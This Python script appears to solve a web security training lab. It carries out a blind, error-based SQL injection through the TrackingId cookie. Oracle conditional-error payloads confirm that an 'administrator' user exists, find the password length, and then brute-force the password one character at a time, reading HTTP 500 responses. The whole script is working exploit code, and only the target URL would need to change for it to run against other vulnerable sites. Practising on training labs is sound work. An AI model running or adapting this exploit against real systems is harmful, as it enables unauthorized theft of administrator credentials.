import requests

# Target URL
url = "https://YOUR-LAB-ID.web-security-academy.net"

session = requests.Session()

def check_tracking_id(cookie_value):
    cookies = {
        'TrackingId': cookie_value
    }
    response = session.get(url, cookies=cookies)

    if response.status_code == 500:
        return True
    return False

# Step 1: Check if 'administrator' user exists
def check_admin_user():
    payload = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    if check_tracking_id(payload):
        print("User 'administrator' exists.")
    else:
        print("User 'administrator' does not exist.")

# Step 2: Determine the password length
def get_password_length():
    length = 0
    while True:
        length += 1
        payload = f"'||(SELECT CASE WHEN LENGTH(password)>{length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        if not check_tracking_id(payload):
            print(f"Password length:", length)
            return length

# Step 3: Determine the password
def get_password(length):
    password = ""
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    
    for position in range(1, length + 1):
        for char in characters:
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            if check_tracking_id(payload):
                password += char
                #print(f"Character {position} found: {char}")
                break
    return password

if __name__ == "__main__":
    check_admin_user()
    password_length = get_password_length()
    password = get_password(password_length)
    print(f"Password for 'administrator': {password}")